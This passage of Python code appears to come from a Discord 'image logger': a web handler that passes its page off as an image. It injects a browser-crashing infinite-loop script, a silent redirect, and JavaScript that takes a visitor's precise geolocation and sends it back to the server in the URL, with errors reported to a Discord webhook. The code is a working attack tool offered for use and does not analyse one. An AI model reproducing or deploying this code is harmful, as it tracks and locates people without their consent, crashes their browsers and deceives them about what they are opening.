                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
